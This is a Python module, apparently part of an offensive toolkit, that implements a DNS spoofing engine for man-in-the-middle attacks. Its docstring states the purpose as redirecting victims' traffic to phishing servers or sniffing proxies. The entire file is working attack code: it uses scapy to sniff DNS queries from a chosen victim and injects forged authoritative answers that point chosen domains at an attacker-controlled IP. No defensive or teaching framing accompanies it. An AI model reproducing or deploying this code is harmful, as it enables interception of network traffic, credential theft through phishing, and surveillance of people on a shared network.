"""
DNS Hijacker
============
DNS spoofing and cache poisoning for MITM attacks.

Intercepts DNS queries and responds with attacker-controlled IPs,
enabling traffic redirection to phishing servers or sniffing proxies.
"""

import socket
import threading
import time
from typing import Dict, Optional
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP


class DNSHijacker:
    """DNS spoofing engine using raw socket packet interception."""

    def __init__(self, iface: str, spoof_ip: Optional[str] = None):
        self.iface = iface
        self.spoof_ip = spoof_ip or "192.168.1.100"
        self.dns_table: Dict[str, str] = {}
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.stats = {"queries_intercepted": 0, "responses_sent": 0}

    def add_record(self, domain: str, ip: str) -> None:
        """Add a DNS spoofing record."""
        self.dns_table[domain.lower()] = ip

    def remove_record(self, domain: str) -> None:
        """Remove a DNS spoofing record."""
        self.dns_table.pop(domain.lower(), None)

    def start(self, target_ip: Optional[str] = None) -> bool:
        """
        Start DNS hijacking.

        Args:
            target_ip: Specific victim IP (None for broadcast)

        Returns:
            True if started successfully
        """
        self._running = True
        self._thread = threading.Thread(
            target=self._dns_loop,
            args=(target_ip,),
            daemon=True,
        )
        self._thread.start()
        return True

    def _dns_loop(self, target_ip: Optional[str]) -> None:
        """Main DNS interception loop."""
        try:
            from scapy.all import sniff
            filter_str = f"udp port 53"
            if target_ip:
                filter_str += f" and host {target_ip}"

            def handle_packet(pkt):
                if not self._running:
                    return
                if pkt.haslayer(DNSQR):
                    self._process_dns_query(pkt)

            sniff(
                iface=self.iface,
                filter=filter_str,
                prn=handle_packet,
                stop_filter=lambda _: not self._running,
                store=0,
            )
        except Exception as e:
            print(f"[DNS] Hijack loop error: {e}")

    def _process_dns_query(self, pkt) -> None:
        """Process intercepted DNS query and send spoofed response."""
        try:
            from scapy.all import sendp
            query_name = pkt[DNSQR].qname.decode().rstrip(".").lower()
            self.stats["queries_intercepted"] += 1

            # Check if we have a spoof record
            spoof_ip = None
            for domain, ip in self.dns_table.items():
                if domain in query_name or query_name in domain:
                    spoof_ip = ip
                    break

            if not spoof_ip:
                return  # Don't interfere with unknown domains

            # Build spoofed response
            resp = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst)
                / UDP(dport=pkt[UDP].sport, sport=53)
                / DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(rrname=query_name, rdata=spoof_ip, ttl=300),
                )
            )
            sendp(resp, iface=self.iface, verbose=0)
            self.stats["responses_sent"] += 1
        except Exception:
            pass

    def stop(self) -> None:
        """Stop DNS hijacking."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)

    def get_stats(self) -> Dict[str, int]:
        """Return hijacking statistics."""
        return {**self.stats, "records": len(self.dns_table)}
